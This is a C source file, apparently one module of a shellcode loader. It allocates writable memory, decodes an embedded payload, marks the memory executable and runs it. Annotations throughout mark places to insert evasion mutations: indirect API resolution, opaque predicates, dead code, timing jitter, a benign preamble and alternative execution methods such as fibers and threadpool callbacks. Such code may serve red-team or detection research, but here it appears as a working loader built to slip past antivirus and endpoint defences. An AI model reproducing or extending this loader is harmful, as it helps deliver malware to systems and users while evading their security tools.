/* MODULE: CARRIER
 * TYPE: alloc_rw_rx
 * DESC: VirtualAlloc(RW) → Decode → VirtualProtect(RX) → Execute
 * MUTATIONS: api_wrapper_injection, getprocaddress_indirection, staged_rx, execution_method
 */
#include "../header/definitions.h"
#include "sc_checkpoint.h"

int carrier() {
    DWORD result;

    // @MUTATE:timing_jitter
    // @MUTATE:benign_preamble

    // @MUTATE:api_wrapper_injection(VirtualAlloc)
    // @MUTATE:getprocaddress_indirection(VirtualAlloc)
    // @MUTATE:literal_encoding
    char *dest = (char*)VirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);

    // @MUTATE:opaque_predicate
    // @MUTATE:dead_code_insertion
    if (!dest) return 1;

    // @MUTATE:timing_jitter
    decode_payload(dest, PAYLOAD_LEN);
    // @MUTATE:api_sequence_obfuscation

    // @MUTATE:staged_rx
    // @MUTATE:api_wrapper_injection(VirtualProtect)
    // @MUTATE:getprocaddress_indirection(VirtualProtect)
    if (!MyVirtualProtect(dest, PAYLOAD_LEN, p_RX, &result)) {
        return 2;
    }
    // @MUTATE:timing_jitter

    ARTIFACT_CHECKPOINT("Launching");
    // @MUTATE:execution_method(direct|callback|fiber|threadpool)
    EXECUTE_SHELLCODE(dest);

    return 0;
}